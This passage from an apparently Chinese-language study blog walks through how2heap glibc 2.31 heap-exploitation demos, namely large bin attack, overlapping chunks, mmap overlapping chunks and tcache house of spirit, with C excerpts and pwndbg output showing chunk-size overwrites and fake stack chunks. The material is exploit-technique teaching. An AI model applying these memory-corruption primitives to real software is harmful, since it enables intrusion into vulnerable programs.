class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-overlapping-chunks"><a href="#6-overlapping-chunks" class="headerlink" title="6. overlapping_chunks"></a>6. overlapping_chunks</h3><p>通过修改 size 造成堆重叠，然后拿到两个指针指向同一个 chunk</p><p>构造如下 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x80</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559310</span>      <span class="number">0x3131313131313131</span>  <span class="number">0x500</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559810</span>      <span class="number">0x3232323232323232</span>  <span class="number">0x80</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>p1 是 大小 0x80 的chunk， p2 是大小为 0x500 的chunk ，p3 是大小为 0x80 的chuk</p><p>然后修改 p2 的大小 为 p2 +p 3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">44</span> <span class="comment">/* VULNERABILITY */</span></span><br><span class="line">► <span class="number">45</span> *(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line">  <span class="number">46</span> <span class="comment">/* VULNERABILITY */</span></span><br></pre></td></tr></table></figure><p>再然后释放 p2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">48</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">► <span class="number">49</span> <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="number">50</span> <span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>再分配一个新的 大小符合修改之后的  chunk， 可以把 修改完 chunk 之后的 p2+p3 重新分配回来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">56</span> p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"> ► <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">   <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">   <span class="number">60</span> <span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line">   <span class="number">61</span></span><br><span class="line">   <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">   <span class="number">63</span>    <span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffe280 —▸ 0x7fffffffe3b8 —▸ 0x7fffffffe633 ◂— &#x27;/media/psf/Home/Downloads/how2heap/glibc_2.31/overlapping_chunks&#x27;</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe288</span> ◂— <span class="number">0x15555556d</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe290</span> —▸ <span class="number">0x7ffff7fb5fc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe298</span> ◂— <span class="number">0x57800000581</span></span><br><span class="line">04:0020│      0x7fffffffe2a0 —▸ 0x5555555592a0 ◂— 0x3131313131313131 (&#x27;11111111&#x27;)</span><br><span class="line">05:0028│      0x7fffffffe2a8 —▸ 0x555555559320 ◂— 0x3232323232323232 (&#x27;22222222&#x27;)</span><br><span class="line">06:0030│      0x7fffffffe2b0 —▸ 0x555555559820 ◂— 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">07:0038│      0x7fffffffe2b8 —▸ 0x555555559320 ◂— 0x3232323232323232 (&#x27;22222222&#x27;)</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">555555555390</span> main+<span class="number">359</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p p4+evil_region_size</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555bee0</span></span><br><span class="line">pwndbg&gt; p p3+<span class="number">0x580</span><span class="number">-8</span></span><br><span class="line">$<span class="number">10</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555c3e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们就会发现 p4 和 p3 重叠了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope p3</span><br><span class="line">00:0000│ rax rdi  0x555555559820 ◂— 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope p4</span><br><span class="line">00:0000│   0x555555559320 ◂— 0x3434343434343434 (&#x27;44444444&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; hexdump <span class="number">0x555555559320</span> <span class="number">0x400</span></span><br><span class="line">+<span class="number">0000</span> <span class="number">0x555555559320</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br><span class="line">+<span class="number">0020</span> <span class="number">0x555555559720</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0120</span> <span class="number">0x555555559820</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  │<span class="number">3333</span>│<span class="number">3333</span>│<span class="number">3333</span>│<span class="number">3333</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0170</span> <span class="number">0x555555559870</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0190</span> <span class="number">0x555555559890</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">71</span> <span class="number">07</span> <span class="number">02</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │<span class="number">4444</span>│<span class="number">4444</span>│q...│....│</span><br><span class="line">+<span class="number">01</span>a0 <span class="number">0x5555555598a0</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="7-mmap-overlapping-chunks"><a href="#7-mmap-overlapping-chunks" class="headerlink" title="7. mmap_overlapping_chunks"></a>7. mmap_overlapping_chunks</h3><pre><code>    GLibC中的Mmap chunks入门知识    ==================================在GLibC中，有一个点，当一个分配是如此之大，以至于malloc决定我们需要一个单独的内存部分来处理它，而不是在正常的堆上分配它。这是由 mmap_threshold var.代替正常的获取块的逻辑，系统调用 Mmap。这将分配一段虚拟内存，并把它还给用户。同样，释放过程也会有所不同。释放的块不是还给一个bin或堆的其他部分，而是使用另一个syscall。*Munmap*. 它接收一个先前分配的Mmap块的指针，并将其释放回内核。Mmap chunks在大小元数据上有一个特殊的位：第二位。如果这个位被设置，那么这个块就被分配为一个Mmap块。Mmap分块有一个prev_size和一个size。大小*代表当前的 分块的大小。一个chunk的*prev_size*表示剩余的空间。的大小（不是直接低于大小的分块）。然而，fd和bk指针并没有被使用，因为Mmap chunks并没有返回到 的大小，就像GLibC Malloc中的大多数堆块一样。释放后， 分块必须是页面对齐的。下面的POC本质上是一个重叠的chunk攻击，但在mmap chunks上。这和https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c 非常相似。主要的区别是，mmapped chunks有特殊的属性，并且是 以不同的方式处理，创造出与正常情况下不同的攻击场景。重叠的分块攻击。还可以做其他的事情。如munmapping系统库、堆本身和其他东西。这只是一个简单的概念证明，目的是为了证明一般的 的方法来执行对 mmap 分块的攻击。 关于GLibC中mmap chunks的更多信息，请阅读这篇文章。http://tukan.farm/2016/07/27/munmap-madness/</code></pre><p>首先使用 malloc 分配几个大的 chunk :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">57</span> <span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line">  <span class="number">59</span></span><br><span class="line">  <span class="number">60</span> <span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">► <span class="number">61</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line">  <span class="number">63</span></span><br><span class="line">  <span class="number">64</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">65</span> <span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br></pre></td></tr></table></figure><p>此时我们可以知道 mmap_chunk_3 的 preve size 和 size 分别为： 0 和 0x101002</p><p>假设我们此时有一个漏洞可以修改 preve_size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">88</span> <span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">  <span class="number">89</span> <span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">► <span class="number">90</span> mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">  <span class="number">91</span> <span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">  <span class="number">92</span> <span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line">  <span class="number">93</span></span><br><span class="line">  <span class="number">94</span> <span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>我们将 prev_size 修改为 0x202002 , 然后我们 free mmap_chunk_3 , </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">102</span> Because of <span class="keyword">this</span> added restriction, the main goal is to get the memory back from the system</span><br><span class="line">  <span class="number">103</span> to have two pointers assigned to the same location.</span><br><span class="line">  <span class="number">104</span> */</span><br><span class="line">  <span class="number">105</span> <span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">► <span class="number">106</span> <span class="built_in">free</span>(mmap_chunk_3);</span><br><span class="line">  <span class="number">107</span></span><br><span class="line">  <span class="number">108</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  109 Would crash, if on the following:</span></span><br><span class="line"><span class="comment">  110 mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">  111 This is because the memory would not be allocated to the current program.</span></span><br></pre></td></tr></table></figure><p>这个时候我们再 malloc 一个大小 0x300000 ， 由于前面发生的合并，所以我们会得到一个 重叠的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">120</span> <span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">121</span> <span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">   <span class="number">122</span> <span class="keyword">long</span> <span class="keyword">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line"> ► <span class="number">123</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">   <span class="number">124</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">     ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">     pwndbg&gt; p overlapping_chunk</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">long</span> <span class="keyword">long</span> *) <span class="number">0x7f78b3e60010</span></span><br><span class="line">pwndbg&gt; p/x overlapping_chunk[<span class="number">-1</span>]</span><br><span class="line">$<span class="number">8</span> = <span class="number">0x301002</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们修改 overlapping_chunk 的数据内容的同时，就是把 mmap_chunk_2 的值修改了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">135</span> <span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line"> ► <span class="number">136</span> <span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">137</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">   <span class="number">138</span> <span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p/x mmap_chunk_2[<span class="number">0</span>]</span><br><span class="line">$<span class="number">14</span> = <span class="number">0x1122334455667788</span></span><br></pre></td></tr></table></figure><h3 id="8-tcache-house-of-spirit"><a href="#8-tcache-house-of-spirit" class="headerlink" title="8. tcache_house_of_spirit"></a>8. tcache_house_of_spirit</h3><p>首先 malloc 一个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span> <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line">  <span class="number">13</span></span><br><span class="line">  <span class="number">14</span> <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">15</span></span><br><span class="line">  <span class="number">16</span></span><br><span class="line">► <span class="number">17</span> <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">  <span class="number">18</span> <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>此时在栈上我们有一个可控目标</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="number">21</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="number">22</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br></pre></td></tr></table></figure><p>将这个可控目标伪造成一个一个chunk ，修改其大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">28</span> fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br></pre></td></tr></table></figure><p>free 这个伪造的 chunk ，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">34</span> a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">  <span class="number">35</span></span><br><span class="line">  <span class="number">36</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">37</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">38</span></span><br></pre></td></tr></table></figure><p>我们就会发现，在 tcache 上有一个栈地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时，我们再malloc 一次，就能把这个栈地址拿回来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /pwn/tcache_house_of_spirit.c</span><br><span class="line">   <span class="number">38</span></span><br><span class="line">   <span class="number">39</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">40</span> <span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">42</span></span><br><span class="line"> ► <span class="number">43</span> assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">44</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7ffe02d9a9e0</span> —▸ <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7ffe02d9a9f0</span> —▸ <span class="number">0x55c7abd8f040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7ffe02d9a9f8</span> ◂— <span class="number">0x40</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7ffe02d9aa10</span> —▸ <span class="number">0x7ffe02d9aa36</span> ◂— <span class="number">0x55c7abd901200000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7ffe02d9aa18</span> —▸ <span class="number">0x55c7abd9040d</span> (__libc_csu_init+<span class="number">77</span>) ◂— add    rbx, <span class="number">1</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>c7abd90368 main+<span class="number">351</span></span><br><span class="line">   f <span class="number">1</span>     <span 